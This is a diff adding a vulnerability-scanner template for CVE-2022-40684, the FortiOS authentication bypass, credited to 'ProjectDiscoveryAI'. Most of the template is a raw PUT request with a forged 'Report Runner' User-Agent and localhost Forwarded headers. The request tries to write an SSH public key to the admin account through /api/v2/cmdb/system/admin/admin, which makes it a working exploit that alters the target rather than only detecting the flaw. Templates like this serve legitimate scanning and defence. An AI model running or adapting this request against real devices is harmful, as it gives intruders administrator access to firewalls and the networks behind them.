@@ -1,0 +1,44 @@
+id: cve-2022-40684
+info:
+  name: Fortinet FortiOS User-Agent Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Fortinet FortiOS has an authentication bypass vulnerability. An attacker can bypass authentication using a specific User-Agent and Forwarded header combination to execute actions with elevated privileges.
+  reference:
+    - https://www.horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684/
+  classification:
+    cve-id: CVE-2022-40684
+    cvss-score: 9.6
+
+variables:
+  uri_path: "/api/v2/cmdb/system/admin/admin"
+  payload: |
+    {
+      "ssh-public-key1": "\"your-id_rsa.pub\""
+    }
+
+http:
+  - raw:
+      - |
+        PUT {{BaseURL}}{{uri_path}} HTTP/1.1
+        User-Agent: Report Runner
+        Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";
+        Content-Type: application/json
+        Content-Length: {{len(payload)}}
+
+        {{payload}}
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "Invalid SSH public key."
+      - type: word
+        words:
+          - "SSH key is good."
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "SSH key is good|Invalid SSH public key"
